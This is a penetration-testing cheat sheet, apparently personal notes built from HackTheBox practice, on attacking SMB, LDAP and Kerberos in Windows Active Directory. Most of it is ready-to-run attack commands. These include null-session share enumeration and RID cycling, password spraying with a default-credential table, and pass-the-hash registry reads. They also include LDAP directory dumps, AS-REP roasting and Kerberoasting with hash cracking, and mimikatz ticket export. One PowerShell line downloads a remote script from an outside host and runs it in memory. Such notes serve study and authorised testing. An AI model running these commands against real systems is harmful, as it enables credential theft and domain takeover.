---
sidebar_position: 4
---

# SMB, LDAP, Kerberos

## SMB

**SMB** stands for Server Message Blocks and can be thought of as an Internet file system. It can be used to share access to files, printers, ports, and other communication on a network.

SMB runs on port 445 and is often used in conjunction with port 139, which runs NetBIOS. Computers and applications on a LAN use NetBIOS to communicate and transmit data.

SMB shares are like different directories that different users / permissions / groups can access. 

The common shares are:

* C$: access C drive
* ADMIN$: access Windows installation directory
* IPC$: special share to facilitate inter-process communication
* PRINT$: access printer information
* SYSVOL: shared dircetory on **domain controller** with a copy of the domain's public files, such as group policy objects and scripts
* NETLOGON: shared dircetory on **domain controller** with a copy of logon scripts and group policies that can be used by computers deployed within a domain

:::tip My tip

We shouldn't be able to access any shares without creds, usually user creds can access C$ and admin creds can access ADMIN$. Sometimes anonymous (null session) is allowed to access IPC$, in that case we use rpcclient to do enumeration (see below).

:::

### SMBv1 vs SMBv2
### Enumeration automated

```bash
# nmap
nmap --script vuln -p 139,445 <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

# enum4linux
enum4linux <IP>
# or with creds
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
```

:::tip My tip

enum4linux usually works better when the target is a linux machine! some checks will fail when scanning windows.

:::

### Manual Enumeration

**SMBClient**

```bash
# list folders 
smbclient --no-pass -L //<IP> # Null/anonymous session
smbclient -U 'username[%passwd]' -L //<IP>  # with creds

# connect to a share
smbclient --no-pass //<IP>/<Folder>         # no creds
smbclient -U 'username[%passwd]' [--pw-nt-hash] //<IP> # with creds
# Note: If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbclient --kerberos //ws01win10.domain.com/C$      # quth with kerberos

# for windows, backslashes also work
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session 
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session (you will be prompted for a password)

# to get all files, first connect to a share, then in interactive shell:
mask ""
recurse ON
prompt OFF
mget *
# NOTE: this downloads to current folder, so mkdir if necessary 
# use recurse to also list dirs and files
```

**rpcclient** 

When you can access IPC$, you can use rpcclient to interact with RPC endpoints via named pipes!

Useful commands:

* Users
    * List users: `querydispinfo` and `enumdomusers`
    * Get user details: `queryuser <0xrid>`
    * Get user groups: `queryusergroups <0xrid>`
    * GET SID of a user: `lookupnames <username>`
    * Get users aliases: `queryuseraliases [builtin|domain] <sid>`
* Groups
    * List groups: `enumdomgroups`
    * Get group details: `querygroup <0xrid>`
    * Get group members: `querygroupmem <0xrid>`
* Domains
    * List domains: `enumdomains`
    * Get SID: `lsaquery`
    * Domain info: `querydominfo`
* SID
    * Find SIDs by name: `lookupnames <username>`
    * Find more SIDs: `lsaenumsid`
    * RID cycling (check more SIDs): `lookupsids <sid>`

You can also connect with creds:

```bash
rpcclient -U '' -N <IP>     # null session
rpcclient -U 'username[%passwd]' -N <IP>     # with creds
rpcclient -k ws01win10.domain.com   # kerberos
```

**crackmapexec**

```bash
# list shares
crackmapexec smb <IP> -u '' -p '' --shares # Null session
crackmapexec smb <IP> -u 'username' -p 'password' --shares # with creds
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares # with creds
```

Read registry with creds using `reg.py` from **Impacket**

```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

### Brute force credentials

common creds taken from [Hacktricks - Pentesting SMB](https://book.hacktricks.xyz/pentesting/pentesting-smb#ipcusd-share):

| username | password|
| -------- | ------- |
|Administrator, admin| (blank), password, administrator, admin|
|arcserve|arcserve, backup|
|tivoli, tmersrvd|tivoli, tmersrvd, admin|
|backupexec, backup|backupexec, backup, arcada|
|test,lab,demo|password,test,lab,demo|

**crackmapexec**
```bash
# password spraying
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success

# rid-brute users
crackmapexec smb 10.1.1.68 -u 'a' -p '' --rid-brute
```
## LDAP

> **LDAP** (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. It usually runs on 389, 3268, 3269.

Think of it as a tree structure for the entire organization.

Enumeration with [python](https://book.hacktricks.xyz/pentesting/pentesting-ldap#basic-enumeration) or with ldapsearch:

```bash
# without creds
ldapsearch -x -h <IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

# with creds
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

# with creds, kerberos instead of NTLM
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -Y GSSAPI -b "DC=<1_SUBDOMAIN>,DC=<TLD>"

```
When you have creds, you can try to dump data, change `CN` for different info:
```bash
# Commonly used CN values
# CN=Users              -> extract users
# CN=Computers          -> extract computers
# CN=<MY NAME>          -> extract my info
# CN=Domain Admins      -> extract domain admins
# CN=Domain Users       -> extract domain users
# CN=Enterprise Admins  -> extract enterprise admins
# CN=Administrators     -> extract Administrators
# CN=Remote Desktop Users   -> extract RDP users

ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<CN>,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

Dump everything
```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
# -x Simple Authentication
# -h LDAP Server
# -D My User
# -w My password
# -b Base site, all data from here will be given
```

## Kerberos

Kerberos is an authentication protocol running on port 88.

Refer to:
* [cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) for attacking kerberos
* [tutorial](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) for attacks

Brute usernames with `kerbrute`:

```bash
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```
Example flow of **ASREPRoasting** (no creds):

```bash
# for asreproasting
GetNPUsers.py -dc-ip 10.10.10.161 -usersfile users.txt -format hashcat -outputfile hashes.asreproast htb/

# ticket in hashcat format, crack hashcat
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

Example flow of **Kerberoasting** (with creds):

**Remote**

```bash
# for kerberoasting, use python 2.7.18 
GetUserSPNs.py <domain>/<username>:<passwd> -outputfile ticket

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783 

# ticket in john format, crack with john
sudo john ticket --wordlist=/usr/share/wordlists/rockyou.txt

# connect with smb or psexec
smbclient //10.10.10.100/Users -U Administrator
psexec.py Administrator@active.htb
```

**Local**

```powershell
# with mimikatz
.\mimikatz "privilege::debug" "kerberos::list /export" exit

# with empire
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.211:8080/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# crack with hashcat or john
hashcat -m 13100 kerb-Hash0.txt /opt/wordlist/rockyou.txt --force
```